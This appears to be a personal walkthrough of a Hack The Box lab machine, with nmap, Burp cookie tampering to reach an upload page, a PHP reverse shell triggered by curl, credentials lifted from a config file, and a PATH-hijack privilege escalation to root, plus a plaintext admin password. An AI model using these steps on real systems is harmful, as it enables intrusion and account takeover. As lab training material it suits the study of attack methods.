@@ -1,0 +1,59 @@
+started initial scan 
+	sudo nmap -T3 -sS -A 10.10.10.28
+Found an apache server running on port 80
+went to the website to find an auto repair site
+Used Burp suite to find the login page
+Once i was on login page I used the credentials I obtained on ArcheType
+
+	user: administrator
+	pass: MEGACORP_4dm1n!!
+
+Once I logged in as admin I found an uploads page that required me to have super admin rights to use it.
+I reloaded the site and used burp suite to set a proxy to analyze the URL and cookies. 
+Admin has id 1 with user value 34322 and role value set to admin, these are custom cookies.
+Using burp suite again using intruder, and sending a list of possible id's to perform a brute force attack
+Once I did this, I checked for responses with 'interesting' lengths.
+I found the super admin response, and was able to get id, user and mail values.
+I intercepted the request to the upload page using burp again, and changed the user value to the one belonging to the super admin. I was then able to access the Uploads page.
+I uploaded a php reverse shell on the server, which I was able to use after setting up a listener port with netcat on my HTB tun0 address and port address 1234.
+I used curl to make a request to the web server, specifying the path where the reverse shell was located.
+
+	curl http://10.10.10.28/uploads/test.php
+
+
+Server made a request through the shell to my own computer and then I was 'in'.
+I then used the following commands to get a proper shell.
+
+	SHELL=/bin/bash script -q /dev/null
+	credentials-Z
+	stty raw -echo
+	fg
+	reset
+	xterm
+
+Although pressing Ctrl-Z and using fg didn't do much for me, I was able to use the shell.
+
+I found a database config file on the server, which had credentials in plain text. I used these credentials to login as robert at oopsie.
+
+using the following commands, I see robert is part of a group called bugtracker, and that there is a binary file with the same name on the server.
+	
+	id
+
+	find / -type f -group bugtracker 2>/dev/null
+
+	ls -al /usr/bin/bugtracker
+
+If I ran the script , it would make use of the cat command, this is revealed using the strings command on the bugtracker binary.
+
+We see that it calls the cat binary using this relative path instead of the absolute path. By creating a malicious cat, and modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root.
+
+Walkthrough advises to do the following:
+
+	export PATH=/tmp:$PATH
+	cd /tmp/
+	echo '/bin/sh' > cat
+	chmod +x cat
+
+However we should work on robert's home directory since , for some reason, tmp won't let us change permissions on the cat file.
+
+When we run the file and input id 1, we get a shell with root privileges, the flags are on the root directory and robert's home directory.
